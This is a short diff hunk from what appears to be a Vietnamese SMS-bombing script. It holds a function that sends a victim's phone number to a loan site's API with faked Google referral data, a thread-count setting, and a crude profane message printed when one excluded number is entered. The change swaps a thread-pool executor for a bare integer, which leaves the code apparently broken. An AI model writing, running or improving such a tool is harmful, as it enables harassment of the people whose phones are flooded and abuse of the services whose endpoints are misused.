@@ -91,7 +91,7 @@ if sdt == "0826363378":
   print("SPAM CÁI LỒN ĐỊT MẸ MÀY À SPAM LỘN NGƯỜI RỒI ")
   exit()
 
-threading = ThreadPoolExecutor(max_workers=int(100000))  
+threading = 5000
 def vayvnd(sdt):
   data = '{"phone":"sdt","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}'.replace("sdt",sdt)
   head = {
